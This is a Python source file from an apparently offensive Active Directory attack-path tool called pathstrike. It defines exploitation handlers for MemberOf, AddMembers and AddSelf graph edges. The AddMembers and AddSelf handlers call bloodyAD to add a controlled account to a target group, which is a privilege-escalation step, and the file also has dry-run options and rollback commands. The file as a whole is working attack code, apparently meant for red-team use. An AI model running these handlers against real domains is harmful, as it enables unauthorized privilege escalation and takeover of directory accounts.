"""Group membership edge exploitation handlers."""

from __future__ import annotations

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import bloodyad_wrapper as bloody


@register_handler("MemberOf")
class MemberOfHandler(BaseEdgeHandler):
    """Handles MemberOf edges.

    MemberOf is purely informational: the source is already a member of
    the target group.  No exploitation action is required -- the handler
    passes through immediately.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        return True, (
            f"{edge.source.name} is already a member of {edge.target.name}; "
            "no action required"
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        self.logger.info(
            "MemberOf pass-through: %s is already in %s", principal, target
        )
        return True, f"{principal} is already a member of {target}", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # No change was made; nothing to roll back.
        return None


@register_handler("AddMembers", "AddMember")
class AddMembersHandler(BaseEdgeHandler):
    """Handles AddMembers edges.

    The controlled principal has the right to add members to the target
    group.  This handler adds the principal (or another controlled user)
    to the target group via bloodyAD.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() != "group":
            return False, f"AddMembers requires a Group target, got {edge.target.label}"
        return True, f"Can add members to group {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)

        if dry_run:
            return True, f"[DRY RUN] Would add {principal} to group {target}", []

        self.logger.info("Adding %s to group %s via AddMembers right", principal, target)
        result = await bloody.add_to_group(self.config, auth_args, principal, target)

        if not result["success"]:
            return (
                False,
                f"Failed to add {principal} to {target}: {result.get('error', 'unknown')}",
                [],
            )

        return True, f"Added {principal} to group {target}", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        return RollbackAction(
            step_index=0,
            action_type="remove_group_member",
            description=f"Remove {principal} from group {target}",
            command=f"bloodyAD remove groupMember {target} {principal}",
            reversible=True,
        )


@register_handler("AddSelf")
class AddSelfHandler(BaseEdgeHandler):
    """Handles AddSelf edges.

    The principal has the right to add *themselves* to the target group.
    Functionally identical to AddMembers but restricted to self-enrollment.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() != "group":
            return False, f"AddSelf requires a Group target, got {edge.target.label}"
        return True, f"Can add self to group {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)

        if dry_run:
            return True, f"[DRY RUN] Would add {principal} to group {target} (AddSelf)", []

        self.logger.info("Adding self (%s) to group %s via AddSelf right", principal, target)
        result = await bloody.add_to_group(self.config, auth_args, principal, target)

        if not result["success"]:
            return (
                False,
                f"Failed to add {principal} to {target}: {result.get('error', 'unknown')}",
                [],
            )

        return True, f"Added {principal} to group {target} (self-enrollment)", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        return RollbackAction(
            step_index=0,
            action_type="remove_group_member",
            description=f"Remove {principal} from group {target} (self-enrollment rollback)",
            command=f"bloodyAD remove groupMember {target} {principal}",
            reversible=True,
        )
